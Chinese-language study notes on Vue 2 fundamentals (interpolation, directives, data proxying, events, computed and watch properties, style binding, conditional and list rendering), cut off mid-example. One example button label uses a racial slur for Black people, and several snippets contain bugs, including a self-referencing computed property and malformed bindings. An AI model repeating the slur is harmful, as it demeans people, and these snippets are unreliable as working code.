# 一、Vue核心

## 1	vue概述

### ①官网

1. 英文官网: https://vuejs.org/
2. 中文官网: https://cn.vuejs.org/



### ②vue的特点

1.  遵循 **MVVM** 模式
2.  编码简洁, 体积小, 运行效率高, 适合移动/PC 端开发
3.  它本身只关注 UI, 也可以引入其它第三方库开发项目



### ③快速入门

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>Hello {{name}}</h1>
    </div>
    <script type="text/javascript">
        // 阻止vue在启动时生成生产提示
        Vue.config.productionTip = false    
        // 创建vue实例
        const x = new Vue({
            el: "#root",    // el的作用就是绑定一个容器
            data: { // data中用于存储数据，数据供el指定的容器去使用，值我们暂时先写成一个对象
                name: "小智"
            }
        })
    </script>
</body>
</html>
```

==容器和vue实例一一对应，一个容器只能对应一个vue实例，一个vue实例只能对应一个容器==





## 2	模板语法

### ①插值语法

-   **功能**：用于解析标签体内容
-   **写法**：`{{xxx}}`，xxx是js表达式，且可以直接读取到data中的所有属性
-   **js表达式** --> 就是js代码

```html
<body>
    <div id="root">
        <h1>插值语法</h1>
        <h3>您好,{{name}}</h3>
    </div>
</body>
<script>
    // 阻止vue在启动时生成生产提示
    Vue.config.productionTip = false

    new Vue({
        el: '#root',
        data:{
            name: 'jack',
        }
    })
</script>
```



### ②指令语法

-   **功能**：用于解析标签（包括：标签属性、标签体内容、绑定事件...），可以绑定任何元素
-   **举例**：v-bind:href="xxx"  或 简写为 :href="xxx"，xxx也是js表达式，且可以直接读取到data中的所有属性
-   **注意**：只是 `v-bind` 可以简写成 `:` 

```html
<body>
    <div id="root">
        <h1>插值语法</h1>
        <h3>您好,{{name}}</h3>
        <h1>指令语法</h1>

        <a bind:href="url">百度一下</a>
        <!-- 冒号的方式 -->
        <a :href="url">百度一下</a>
    </div>
</body>
<script>
    // 阻止vue在启动时生成生产提示
    Vue.config.productionTip = false
    new Vue({
        // 第一种绑定容器方式：el
        el: '#root',
        data:{
            name: 'jack',
            url: 'https://www.baidu.com',
        }
    })
</script>
```

![image-20211121162843449](D:\学习笔记\img\20211121162844.png)

**结果显示**

![image-20211121162948831](D:\学习笔记\img\20211121162950.png)





## 3	el与data的两种写法

### ①绑定容器的两种方式

```html
<script>
    // 阻止vue在启动时生成生产提示
    Vue.config.productionTip = false
    v = new Vue({
        // 第一种绑定容器方式：el
        // el: '#root',
        data:{
            name: 'jack',
            url: 'https://www.baidu.com',
        }
    })
    console.log(v)  // 输出vue实例对象
    // 第二种绑定容器的方式 --> 通过vue实例绑定
    v.$mount('#root')
</script>
```



### ②data的两种方式

-   对象式子

-   函数式

    组件的时候会用到，必须要使用函数式，不然就会报错

**注意**：一定不要写箭头函数，一旦写了箭头函数，this就不是vue实例了，也就是说不能调用vue实例中的方法了

```html
<script>
    // 阻止vue在启动时生成生产提示
    Vue.config.productionTip = false
    v = new Vue({
        // 第一种绑定容器方式：el
        // el: '#root',
        // data:{
        //     name: 'jack',
        //     url: 'https://www.baidu.com',
        // }
        // data第二种方式 --> 函数式
        data:function(){
            return {
                name: '小智'
            }
        }
        // 不能写成箭头函数的 --> 输出的是window对象
        // data:() => {
        //     console.log('@@@', this)
        //     return {
        //         name: '小智'
        //     }
        // }
    })
    console.log(v)  // 输出vue实例对象
    // 第二种绑定容器的方式 --> 通过vue实例绑定
    v.$mount('#root')
</script>
```

![image-20211121161829942](D:\学习笔记\img\20211121161831.png)

**设置成箭头函数，this是window**

![image-20211121162241652](D:\学习笔记\img\20211121162242.png)





## 4	数据绑定

```html
<body>
    <!-- 
        vue中有2中数据绑定的方式：
            1.单向绑定(v-bind)：数据只能从data流向页面
            2.双向绑定(v-model)：数据不仅能从data流向页面，
              还能从页面流向data，也就是一个数据变化，另外一个也会变化
        注意：
            1.双向绑定一般应用在表单类元素上（输入元素）
            2.v-model:value 可以简写成 v-model，因为v-model默认绑定的就是value值
     -->
     <div id="root">
         单向数据绑定: <input type="text" :value='name'><br>
         双向数据绑定: <input type="text" v-model:value='name'><br>
         <!-- 简写方式 -->
         双向数据绑定: <input type="text" v-model='name'><br>
         <!-- 不能像下面一样写，会报错！！！ -->
         <h2 v-model:x='name'>hello</h2>
     </div>
     <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: '小智'
            }
        })
     </script>
</body>
```

![image-20211121164556688](D:\学习笔记\img\20211121164558.png)

 

## 5	MVVM模型

-   **M**：模型(model)：对应data中的数据
-   **V**：视图(view)：模板
-   **VM**：视图模型(ViewModel)：Vue实例对象

![image-20211121165713423](D:\学习笔记\img\20211121165714.png)

```html
<body>
    <!-- 
        MVVM模型：
            M：模型(model)：对应data中的数据
            V：视图(view)：模板
            VM：视图模型(ViewModel)：Vue实例对象
        发现：
            1.data中所有的属性，最后都出现在vm(vue实例)身上
            2.vm(vue实例)上的所有属性 以及 vue原型上的所有属性，在vue模板中都可以直接使用
     -->
    <div id="root">
        <h1>学校名称：{{name}}</h1>
        <h1>学校地址：{{address}}</h1>
        <!-- 使用vue实例上的属性 -->
        <h1>测试1：{{$createElement}}</h1>
        <h1>测试2：{{_c}}</h1>
    </div>
    <script>
        Vue.config.productionTip = false
        vm = new Vue({
            el: '#root',
            data: {
                name: '清华大学',
                address: '北京'
            }
        })
        console.log(vm)
    </script>
</body>
```

![image-20211121170644417](D:\学习笔记\img\20211121170645.png)

==**总结**：模板不仅可以是js表达式，还可以是vue实例中的属性，data中的值也是在vue实例中的==



## 6	数据代理

这里讲的是data中的数据是怎么和vue实例中的属性产生关联的

### ①回顾Object.defineProperty方法

**作用**：给对象定义属性的

```html
<body>
    <!-- 
        Object.defineProperty(1, 2, 3)
            参数：第一个参数是要定义的对象，第二个参数是要定义的属性，第三个是属性的值
            枚举：用它定义的属性，默认是不参与枚举的，通俗一点就是不参与遍历
            备注：可以使用配置项来对属性进行定制化
                 比如：使用 enumerable:true 来让这个属性可以被遍历
     -->
    <script>
        Vue.config.productionTip = false
        // 创建一个person对象
        let number = 20
        let person = {
            name: '小智',
            sex: '男',
            // age: 20,
        }
        Object.defineProperty(person, 'age', {
            // value: 18,
            // enumerable: true,   // 控制属性是否可以枚举，默认值是false
            // writable: true,     // 控制属性值是否可以被修改，默认是false
            // configurable: true, // 控制属性是否可以被删除，默认是false
            // get的值是一个函数，当读取person中的age的时候就会调用get，返回值就是age的值
            // 第一种写法 --> 代理get函数的名字是f1
            // get:function f1(){
            //     return "hello"
            // }
            // 第二种写法 --> 默认的代理函数名getter
            get() {
                return number
            },
            // set，就是设置person中的age时会调用set函数，然后修改对应的值
            set(value) {
                number = value
            },
        })

    </script>
</body>
```

![image-20211122183516624](D:\学习笔记\img\20211122183518.png)

**发现**：代理的属性值是三个点，那是因为我们并没有去读取它，点击它之后它就直接展示在控制台上了



### ②理解数据代理

```js
<script>
    let obj1 = {x:100}
    let obj2 = {y:200}
    // 进行数据代理
    Object.defineProperty(obj2, 'x', {
        get(){
            return obj1.x
        },
        set(value){
            obj1.x = value
        }
    })
</script>
```

![image-20211122184420351](D:\学习笔记\img\20211122184421.png)



### ③vue中的数据代理

```html
<body>
    <!-- 
        1.Vue中的数据代理：
            通过vm对象来代理data对象中属性的操作（读/写）
        2.Vue中数据代理的好处：
            更加方便的操作data中的数据
        3.基本原理：
            通过Object.defineProperty()把data对象中所有属性添加到vm上。
            为每一个添加到vm上的属性，都指定一个getter/setter。
            在getter/setter内部去操作（读/写）data中对应的属性。
	-->
    <div id="root">
        <h1>姓名: {{name}}</h1>
        <h1>年龄: {{age}}</h1>
    </div>
    <script>
        const vm = new Vue({
            el: "#root",
            // data中的数据存放在vm中的_data对象中
            data: {
                name: '小智',
                age: 18
            },
        })
        console.log(vm)
    </script>
</body>
```

![image-20211122190751251](D:\学习笔记\img\20211122190752.png)

![image-20211122190517826](D:\学习笔记\img\20211122190519.png)

![image-20211122185617377](D:\学习笔记\img\20211122185619.png)





## 7	事件处理

### ①事件处理的基本使用

```html
<body>
    <!-- 
        事件的基本使用：
            1.使用v-on:xxx="执行方法名" 或 @xxx='执行方法名'，其中xxx是事件名
            2.时间的回调需要配置在methods对象中，最终会在vm上
            3.methods中配置的函数，不要用箭头函数！否则this对象就不是vm了
            4.methods中配置的函数，都是被vue所管理的函数，this的指向是vm 或 组件实例对象
            5.@click="demo" 和 @click="demo($event)" 效果一直，或者是可以传参的，参数在括号里面，用逗号隔开
     -->
    <div id="root">
        <button v-on:click='showInfo'>点我查看信息（不传参）</button>
        <!-- 省略写法 -->
        <!-- 用$来表示传入对象 -->
        <button @click='showInfo2($event, 1, 2, 3)'>点我查看信息2（传参）</button>
    </div>
    <script>
        // 这中方式是不行的，必须放在vue实例里面
        // function showInfo(){
        //     alter('你好！！！')
        // }
        const vm = new Vue({
            el: '#root',
            data: {},
            methods: {
                showInfo() {
                    // 默认传入的是vue实例
                    console.log(this)
                    // alert('你好！！！')
                },
                // 不传入event参数，它默认也还是传入到方法中的
                showInfo2(a, b, c) {
                    console.log(event, a, b, c)
                }
            }
        })
    </script>
</body>
```



### ②事件修饰符

**作用**：限定事件的执行，比如：事件只执行一次，下一次不执行

```html
    <style>
        * {
            margin-top: 20px;
        }
        .box1 {
            height: 100px;
            background-color: chartreuse;
        }
        .box2 {
            height: 50px;
            background-color: cyan;
        }
        .div1{
            height: 200px;
            background-color: darkmagenta;
        }
        .div2 {
            height: 80px;
            background-color: darkturquoise;
        }
        .once {
            background-color: deeppink;
        }
        ul {
            height: 200px;
            background-color: gold;
            overflow: auto;
        }
        li {
            height: 80px;
            background-color: lawngreen;
        }
    </style>
</head>

<body>
    <!-- 
        事件修饰符
            1.prevent：阻止默认事件（常用）
            2.stop：阻止事件冒泡（常用）
                解释：事件冒泡就是在一个有事件的div里面有一个button，当点击这个button的时候，
                      会先触发button中的事件，然后再触发div中的事件，就是往上冒，所以叫冒泡
            3.once：事件只触发一次（常用）
            4.capture：使用事件的捕获模式
                解释：事件捕获，有多个元素事件嵌套下，会进行事件捕获，从完成向内捕获
                比如：div有一个事件，在它里面有一个div也有事件，当点击里面的div时，
                     会触发事件的捕获，然后会进行事件的冒泡，
                     点击外面的div是不会触发捕获事件的，也不会有事件冒泡
            5.self：只有event.target是当前操作的元素才触发事件
                注：event.target是当前触发事件的元素
            6.passive：事件的默认行为立即执行，无需等待时间回调执行完毕
                比如：就是说滚轮滑动（wheel）触发事件，会先执行完触发的事件再触发滚轮滑动
        备注：可以使用event.target来查看是点击了那个元素
	    注意：一个事件可以使用多个修饰符，例如@click.stop.prevent
     -->
    <div id="root">
        <!-- prevent；阻止默认事件 比如阻止a标签的跳转 -->
        <h1>欢迎来到{{name}}</h1>
        <a href="https://www.baidu.com" @click.prevent='showInfo'>点我跳转到百度</a>

        <!-- stop：阻止事件冒泡（常用） -->
        <!-- 正常来说，当我们点击button的时候会触发两次事件，我们使用修饰符来阻止冒泡的发生 -->
        <div @click='showInfo' class="box1">
            <!-- 加了stop修饰符就不会出现冒泡了 -->
            <button class="box2" @click.stop='showInfo'>点我提示信息</button>
        </div>

        <!-- once：事件只触发一次（常用） -->
        <button class="once" @click.once="showInfo">触发一次事件</button>

        <!-- capture：使用事件的捕获模式 -->
        <div class="div1" @click.capture='showInfo2(1)'>
            div1
            <div class="div2"  @click='showInfo2(2)'>
                div2
            </div>
        </div>

        <!-- self：只有event.target是当前操作的元素才触发事件 -->
        <!-- 现在就不会出现事件冒泡的情况，因为只有点击了div1才会触发div1的事件 -->
        <div class="div1" @click.self='showInfo2("div1")'>
            div1
            <div class="div2"  @click='showInfo2("div2")'>
                div2
            </div>
        </div>

        <!-- passive：事件的默认行为立即执行，无需等待时间回调执行完毕 -->
        <!-- @wheel.passive就变成了scroll了，不同的是鼠标滚轮滑动，前者依然会执行事件函数，而后者不会 -->
        <ul @wheel.passive="demo">  
            <!-- 
                说明：1.使用wheel事件，不管滑条是否到底，只要有滚轮滚动它就会执行事件函数，而且等待回调执行完毕
                     2.wheel事件首先执行的是事件函数，然后再执行滑动行为
                     3.如果wheel事件执行的是一个耗时的函数，那么它会有明显的卡顿现象
                备注：scroll事件的滑动行为是和事件一起执行的
             -->
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>

    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '小智的代码时间',
            },
            methods: {
                showInfo(){
                    alert('好兄弟，你好!!!')
                },
                showInfo2(a){
                    // alert('好兄弟，你好!!!')
                    console.log(a)
                },
                demo() {
                    for (let index = 0; index < 10; index++) {
                        console.log("#")
                    }
                    console.log("执行完毕")
                },
            }
        })
    </script>
</body>
```





### ③	键盘事件 

```html
<body>
    <!-- 
        1.vue常用的按键别名
            回车 => enter
            删除 => delete(捕获“删除”和“退格”键)
            退出 => esc
            空格 => space
            上 => up
            下 => down
            左 => left
            右 => right
        
        2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但是两个字母的要转为kebab-case(短横线命名)

        3.系统按键（用法特殊）：ctrl、alt、shift、win
            (1) 配置keyup使用：按下系统按键的同时按其他键，随后释放其他键，事件才会触发
            (2) 配置keydown使用：正常会触发事件

        4.也可以使用keyCode（按键编号）去指定具体的按键（不推荐）

        5.Vue.config.keyCode.自定义别名 = 键码 ：可以去自定义按键别名
     -->
    <div id="root">
        <h1>小智的快乐时间</h1>
        <!-- vue常用的按键别名 -->
        使用vue默认提供的<input type="text" @keyup.enter="showInfo"><br>
        <!-- 使用两个英文单词的按键 => 大写键 -->
        使用大写键<input type="text" @keyup.caps-lock="showInfo"><br>
        <!-- 使用按键编号，下面的等同于上面的功能 -->
        使用按键编号<input type="text" @keyup.13="showInfo"><br>
        <!-- 使用系统按键 -->
        使用系统按键 --> ctrl+y<input type="text" @keyup.ctrl.y='showInfo'><br>
        <!-- 使用自定义别名 -->
        使用自定义别名<input type="text" @keyup.test='showInfo'><br>
    </div>
    <script>
        Vue.config.productionTip = false
        // 自定义别名
        Vue.config.keyCodes.test = 13
        
        const vm = new Vue({
            el: '#root',
            data: {
                name: '小智的代码时间',
            },
            methods: {
                showInfo(e) {
                    /* 
                        说明:
                            e --> event对象
                            e.key --> 是键盘的键
                            e.keyCode --> 是键盘对应的编号
                            e.target --> 执行函数的元素
                            e.target.value --> 获取到对应元素的值
                    */
                    console.log(e.target.value)
                    // console.log(e.key, e.keyCode)
                }
            }
        })
    </script>
</body>
```





## 8	计算属性

只要data中的数据发生改变，如果vue模板中有使用到data中的数据，那么vue实例就会重新加载模板



### ①插值语法实现计算属性

```html
<body>
    <div id="root">
        姓<input type="text" v-model="firstName"><br>
        名<input type="text" v-model="lastName"><br>
        全名 <span>{{firstName}}-{{lastName}}</span><br>
    </div>
<script>
    // Vue.config.productionTip = false
    const vm = new Vue({
        el: "#root",
        data: {
            firstName: '张',
            lastName: '三',
        },
    })
</script>
</body>
```



### ②methods实现计算属性

```html
<body>
    <div id="root">
        姓<input type="text" v-model="firstName"><br>
        名<input type="text" v-model="lastName"><br>
        全名 <span>{{getName()}}</span><br>
    </div>
<script>
    // Vue.config.productionTip = false
    const vm = new Vue({
        el: "#root",
        data: {
            firstName: '张',
            lastName: '三',
        },
        methods: {
            getName() {
                return this.firstName + "-" + this.lastName
            }
        }
    })
</script>
</body>
```



### ③vue中的计算属性

```html
<body>
    <!-- 
        计算属性(computed)：
            1.定义：要用的属性不存在，要通过已有属性计算得来。
            2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
            3.get函数什么时候执行？
                (1).初次读取时会执行一次。
                (2).当依赖的数据发生改变时会被再次调用。
            4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
            5.备注：
                1.计算属性最终会出现在vm上，直接读取使用即可。
                2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
	-->
    <div id="root">
        姓<input type="text" v-model="firstName"><br>
        名<input type="text" v-model="lastName"><br>
        全名 <span>{{getName()}}</span><br>
    </div>
    <script>
        // Vue.config.productionTip = false
        const vm = new Vue({
            el: "#root",
            data: {
                firstName: '张',
                lastName: '三',
            },
            computed: {
                fullName: {
                    // get的作用：当读取fullName的时候，get就会被调用，返回值作为fullName的值
                    get() {
                        console.log('get方法被调用了')
                        // 此处的this是vm
                        console.log(this)
                        // 在computed中不能直接使用data中的数据，需要使用this去调用
                        return this.firstName + '-' + this.lastName
                    }
                }
            }
        })
    </script>
</body>
```



### ④计算属性简写形式

```js
computed: {
    // 简写形式 --> 只读取不修改的情况下才能使用，简写形式相当于是写了get函数
    fullName() {    // 函数名字就是对应的属性，通过名字取出对应的值
        return this.firstName + '-' + this.lastName
    }
}
```





## 9	侦听属性

### ①天气案例

```html
<body>
    <div id="root">
        <h1>天气：{{weather}}</h1>
        <button @click='changeWeather'>点击变化天气</button>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot
                }
            },
            computed: {
                // 计算属性
                weather(){
                    return this.isHot ? '炎热' : '寒冷'
                }
            }
        })
    </script>
</body>
```



### ②侦听属性

```html
<body>
    	<!-- 
            监视属性watch：
                1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
                2.监视的属性必须存在，才能进行监视！！
                3.监视的两种写法：
                    (1).new Vue时传入watch配置
                    (2).通过vm.$watch监视
                注意：配置项的名字一定是和监听的元素的名字一致的，不然是不会触发监听事件的
		-->
    <div id="root">
        <h1>天气：{{weather}}</h1>
        <button @click='changeWeather'>点击变化天气</button>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot
                }
            },
            computed: {
                // 计算属性
                weather(){
                    return this.isHot ? '炎热' : '寒冷'
                }
            },
            // 当监听的元素发生改变时，就会调用watch中的函数
            watch: {
                // 这个配置项的名字一定是和监听的元素的名字一致的
                isHot: {
                    immediate: true,    // 初始化时让handler调用一下
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue)
                    }
                },
            }
        })
        // vm.$watch(1, 2)的方式 --> 1.监听的属性  2.监听事件执行的函数
        // vm.$watch('isHot', {
        //     handler(newValue, oldValue) {
        //         console.log(newValue, oldValue)
        //     }
        // })
    </script>
</body>
```



### ③深度侦听

```html
<body>
    	<!-- 
            深度侦听：
                (1).Vue中的watch默认不监测对象内部值的改变（一层）。
                (2).配置deep:true可以监测对象内部值改变（多层）。
            备注：
                (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
                (2).使用watch时根据数据的具体结构，决定是否采用深度监视。
		-->
    <div id="root">
        <h1>天气：{{weather}}</h1>
        <button @click='changeWeather'>点击变化天气</button>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                numbers: {
                    x: 100,
                    y: 200,
                }
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot
                }
            },
            computed: {
                // 计算属性
                weather(){
                    return this.isHot ? '炎热' : '寒冷'
                }
            },
            // 当监听的元素发生改变时，就会调用watch中的函数
            watch: {
                // 这个配置项的名字一定是和监听的元素的名字一致的
                isHot: {
                    immediate: true,    // 初始化时让handler调用一下
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue)
                    }
                },
                // numbers.x --> 表示监控numbers下的x属性，必须要用引号括起来，不然会报错！！！
                // 如果是numbers --> 表示监控的是整个numbers，当重新创建一个对象赋给numbers的时候才会触发监听事件
                // 'numbers.x': {
                //     handler() {
                //         console.log('numbers被修改了')
                //     }
                // }
                // 监听多级结构中某个属性的变化
                numbers: {
                    // deep: true表示开启深度监视 --> 对象当中有一个属性发生了变化就会触发监听事件
                    deep: true,
                    handler() {
                        console.log('numbers改变了')
                    }
                }     
            }
        })
    </script>
</body>
```



### ④侦听属性简写

```html
<body>
    <div id="root">
        <h1>天气：{{weather}}</h1>
        <button @click='changeWeather'>点击变化天气</button>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot
                }
            },
            computed: {
                // 计算属性
                weather(){
                    return this.isHot ? '炎热' : '寒冷'
                }
            },
            watch: {
                isHot: {
                    immediate: true,    // 初始化时让handler调用一下
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue)
                    }
                },
                // 正常写法
                // numbers: {
                //     deep: true,
                //     handler() {
                //         console.log('numbers改变了')
                //     }
                // }     

                // 简写 --> 只有handler的情况才能简写
                isHot() {   // 函数名是监听属性名
                    console.log('isHot发生了变化')
                }
            }
        })
        // 正常写法
        // vm.$watch(1, 2)的方式 --> 1.监听的属性  2.监听事件执行的函数
        // vm.$watch('isHot', {
        //     handler(newValue, oldValue) {
        //         console.log(newValue, oldValue)
        //     }
        // })
        // vm.$watch()方式简写
        // vm.$watch('isHot', function(newValue, oldValue){
        //     console.log(newValue, oldValue)
        // })
    </script>
</body>
```



### ⑤computed和watch对比

watch实现姓名案例

```html
<body>
    <!-- 
        computed和watch之间的区别：
            1.computed能完成的功能，watch都可以完成。
            2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
        两个重要的小原则 -> 让this指向vm：
            1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
            2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），
			 最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。
        备注：箭头函数它如果在当前函数内找不到this，那么它就会往上找
	-->
    <div id="root">
        姓<input type="text" v-model="firstName"><br>
        名<input type="text" v-model="lastName"><br>
        <span>全名 {{fullName}}</span>
    </div>
    <script>
        Vue.config.productionTip = false
        // 创建vue实例对象
        const vm = new Vue({
            el: "#root",
            data: {
                firstName: '张',
                lastName: '三',
                fullName: '张-三'
            },
            computed: {
                fullName(){
                    return this.fullName + "-" + this.lastName
                }
            },
            watch: {
                firstName(newValue, oldValue) {
                    this.fullName = newValue + "-" + this.lastName
                },
                lastName(newValue, oldValue) {
                    this.fullName = this.firstName + "-" + newValue
                }
            },
        })
    </script>
</body>
```



## 10	绑定样式

```html
    <style>
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }

        .happy {
            border: 4px solid red;
            ;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }

        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }

        .normal {
            background-color: skyblue;
        }

        .c1 {
            background-color: yellowgreen;
        }

        .c2 {
            font-size: 30px;
            text-shadow: 2px 2px 10px red;
        }

        .c3 {
            border-radius: 20px;
        }
    </style>
    <script src="../js/vue.js"></script>
</head>

<body>
    <!-- 
        绑定样式：
            1. class样式
                写法:class="xxx" xxx可以是字符串、对象、数组。
                        字符串写法适用于：类名不确定，要动态获取。
                        数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。
                            对数组进行增删改查操作来改变样式的个数和名字
                        对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
            2. style样式
                :style="{fontSize: xxx}"其中xxx是动态值。
                :style="[a,b]"其中a、b是样式对象。
    -->
    <div id="root">
        <!-- 类名不确定，需要动态获取 -->
        <div class="basic" :class='className' @click='changeClass'>test</div><br><br>
        <!-- 要绑定多个样式，个数不确定，名字也不确定。 -->
        <div class="basic" :class='classList'>test</div><br><br>
        <!-- 要绑定多个样式，个数确定，名字也确定，但不确定用不用。 -->
        <div class="basic" :class='classObj'>test</div><br><br>

        <!-- style对象写法 -->
        <div class="basic" :style='styleObj'>test</div><br><br>
        <!-- style数组写法 -->
        <div class="basic" :style='[styleObj, styleObj2]'>test</div><br><br>
        <div class="basic" :style='styleList'>test</div><br><br>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                className: 'normal',
                // 数组形式
                classList: ['c1', 'c2', 'c3'],
                // 对象形式
                classObj: {
                    // 里面写样式名 --> true就是使用，false就是不使用
                    c1: true,
                    c2: false,
                },
                // 控制style的对象
                styleObj: {
                    // 这个key必须是存在的，key对象的是css的属性
                    fontSize: '50px',
                    color: "red"
                },
                styleObj2: {
                    backgroundColor: 'orange'
                },
                styleList: [
                    {
                        fontSize: '50px',
                        color: "red"
                    },
                    {
                        backgroundColor: 'green'
                    }
                ]
            },
            methods: {
                changeClass() {
                    const arr = ['happy', 'sad', 'normal']
                    // Math.floor() --> 向下取整
                    const index = Math.floor(Math.random() * 3)
                    this.className = arr[index]
                },
            }
        })
    </script>
</body>
```

**补充：CSS 中的 `v-bind()`**

在 css 中可以绑定响应式变量，随着变量变化，css样式也发生变化

```html
<template>
  <div class="text">hello</div>
</template>

<script>
export default {
  data() {
    return {
      color: 'red'
    }
  }
}
</script>

<style>
.text {
  color: v-bind(color);
}
</style>
```



## 11	条件渲染

```html
<body>
    <!-- 
        条件渲染：
            1.v-if
                写法：
                        (1).v-if="表达式" 
                        (2).v-else-if="表达式"
                        (3).v-else="表达式"
                适用于：切换频率较低的场景。
                特点：不展示的DOM元素直接被移除。
                注意：1.v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
                     2.else中不用写表达式，写了也是无效的

            2.v-show
                写法：v-show="表达式"
                适用于：切换频率较高的场景。
                特点：页面上不会展示出来(使用样式隐藏了)，但是源代码还是存在的
                
            3.使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
            4.如果不希望改变元素结构时，可以使用template元素包裹，template不会被展示在页面上（案例）
	-->
    <div id="root">
        <!-- show -->
        <div v-show="false"><h1>我是个靓仔</h1></div>
        <!-- if -->
        <button @click="a++">点击显示内容</button>
        <!-- <div v-if="a === 1"><h1>我是小明</h1></div>
        <div v-if="a === 2"><h1>我是小红</h1></div>
        <div v-if="a === 3"><h1>我是小黑</h1></div> -->
        <!-- if-elseif-else的写法 -->
        <div v-if="a === 1"><h1>我是小明</h1></div>
        <div v-else-if="a === 2"><h1>我是小红</h1></div>
        <div v-else-if="a === 3"><h1>我是小黑</h1></div>
        <div v-else><h1>我谁也不是</h1></div>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                a: 0,
            },
        })
    </script>
</body>
```





## 12	列表渲染

### ①基本列表

```html
<body>
    <!-- 
        v-for指令:
            1.用于展示列表数据
            2.语法：v-for="(item, index) in xxx" :key="yyy"，括号可以省略，但是建议加上
                item -> 表示每一项数据项
                index -> 表示索引，从0开始
            3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
    -->
    <div id="root">
        <h2>人员列表（遍历数组）</h2>
        <ul>
            <!-- 使用of或者in都可以 -->
            <!-- 第一个参数是遍历的每项，第二个参数是索引值 -->
            <li v-for="(p, index) of persons" :key="index">
                {{p.name}}--{{p.age}}--{{index}}
            </li>
        </ul>

        <h2>汽车信息（遍历对象）</h2>
        <ul>
            <!-- 第一个参数是遍历的每项，第二个参数是key(对象的属性名) -->
            <li v-for="(value, key) in car" ::key="key">
                {{key}}--{{value}}
            </li>
        </ul>

        <h2>遍历字符串（用得少）</h2>
        <ul>
            <!-- 第一个参数是遍历的每项，第二个参数是索引 -->
            <li v-for='(value, index) of str' ::key="index">
                {{a}}--{{b}}
            </li>
        </ul>

        <h2>遍历指定字数（用得少）</h2>
        <ul>
            <!-- 第一个参数是遍历的每项，第二个参数是索引 -->

            <li v-for='(a, b) of 5'>
                {{a}}--{{b}}
            </li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                persons: [
                    { id: 001, name: '小黑', age: 18 },
                    { id: 002, name: '小路', age: 19 },
                    { id: 003, name: '小狗', age: 20 },
                ],
                car: {
                    name: '本田',
                    price: 200000,
                },
                str: 'abcdefg'
            }
        })
    </script>
</body>
```



### ②key的作用和原理

```html
<body>
    <!-- 
        面试题：react、vue中的key有什么作用？（key的内部原理）
                
            1. 虚拟DOM中key的作用：
                key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
                随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
                            
            2.对比规则：
                (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
                    ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
                    ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

                (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
                    创建新的真实DOM，随后渲染到到页面。
                                    
            3. 用index作为key可能会引发的问题：
                1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
                    会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

                2. 如果结构中还包含输入类的DOM：
                    会产生错误DOM更新 ==> 界面有问题。

            4. 开发中如何选择key?:
                1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
                2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
                    使用index作为key是没有问题的。
	-->
    <div id="root">
        <button @click="addOne">添加黑鬼</button>
        <ul>
            <!-- index不是唯一标识，会发生顺序的错乱 -->
            <li v-for='(p, index) of persons' :key="index">
                {{p.name}} <input type="text">
            </li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                persons: [
                    { id: 001, name: '小黑', age: 18 },
                    { id: 002, name: '小路', age: 19 },
